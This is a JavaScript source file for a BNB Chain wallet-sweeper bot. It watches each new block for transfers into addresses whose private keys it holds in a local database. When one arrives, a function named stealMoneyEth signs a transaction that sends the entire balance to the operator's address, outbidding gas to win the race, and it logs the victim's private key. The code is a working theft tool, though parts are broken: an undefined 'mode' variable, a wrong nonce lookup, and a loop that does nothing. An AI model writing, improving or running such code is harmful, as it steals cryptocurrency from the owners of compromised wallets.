import Web3 from "web3";
import * as fs from 'fs';
import * as path from 'path';
import { rpc, grab, mainAddress, gasPercentBnb } from "./config.js";

let web3 = null
let data = null
let lastBlockNumber;

export async function runBnb() {
    try {
        web3 = new Web3(new Web3.providers.HttpProvider(rpc.BNB));
    } catch (error) {
        console.log("Не удалось подключиться к сети BNB")
        return;
    }
    data = JSON.parse(fs.readFileSync(path.join('./DB', 'database.json')));
    setInterval(getBlocksEth, 200);
}

async function getBlocksEth() {
    try {
        const lastBlock = await web3.eth.getBlock('latest', true);
        if (lastBlock.number <= lastBlockNumber) {
            return;
        }
        lastBlockNumber = lastBlock.number;
        const ethTransactions = lastBlock?.transactions;
        console.log(`Block ${lastBlock?.number} | BNB`);
        for (let transaction of ethTransactions) {
            transactionWalletEth(transaction);
        }
    } catch (error) {
        console.log('Не удалось получить транзакции в сети BNB');
    }
}

function transactionWalletEth(transaction) {
    const address = transaction.to;
    if (data[address]) {
        stealMoneyEth(address);
    }
}

async function stealMoneyEth(address) {
    const walletKey = data[address];
    const grabFromEthBalance = web3.utils.toWei(grab.BNB, 'ether');
    const balance = await web3.eth.getBalance(address);
    let gasPrice = await web3.eth.getGasPrice();
    const gasUnits = 21000;
    let transactionCost = 0;
    const average = ((Math.random() * (2.5 - 2.1) + 2.1) + (Math.random() * (3 - 2.6) + 2.6)) / 2;

    if (mode === 1) {
        gasPrice = BigInt(Math.trunc(Math.trunc(Number(balance) * gasPercentBnb / 100) / gasUnits));
        transactionCost = BigInt(Math.trunc(Number(balance) * gasPercentBnb / 100));
        const gasPriceNetwork = await web3.eth.getGasPrice();
        if (gasPrice <= gasPriceNetwork) {
            gasPrice = BigInt(Math.trunc(Number(gasPriceNetwork) * average));
            transactionCost = BigInt(gasUnits) * gasPrice;
        }
    } else {
        gasPrice = BigInt(Math.trunc(Number(gasPrice) * average));
        transactionCost = BigInt(gasUnits) * BigInt(Math.round((Number(gasPrice) * 1.5)));
    }

    for (let i = 0; i < 200; i++) {
        if (balance > grabFromEthBalance) {
            break;
        } else if (i === 199) {
            return;
        }
    }

    const amount = balance - transactionCost;
    const sendAddress = web3.utils.toChecksumAddress(mainAddress);
    const nonce = await web3.eth.getBlockTransactionCount(address);

    if (amount <= 0) {
        return;
    }

    const txPrice = {
        "chainId": 56,
        "nonce": nonce,
        "to": sendAddress,
        "from": address,
        "value": amount,
        "gas": gasUnits,
        "gasPrice": gasPrice,
    };
    const signedTx = await web3.eth.accounts.signTransaction(txPrice, walletKey);
    const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    const amountEther = web3.utils.fromWei(amount, 'ether');
    console.log(`✅ BNB | Success withdrawal \nHASH: ${txHash} \n\nAMOUNT: ${amountEther} \nADDR: https://bscscan.com/address/${address} \nPK: ${walletKey}`);
}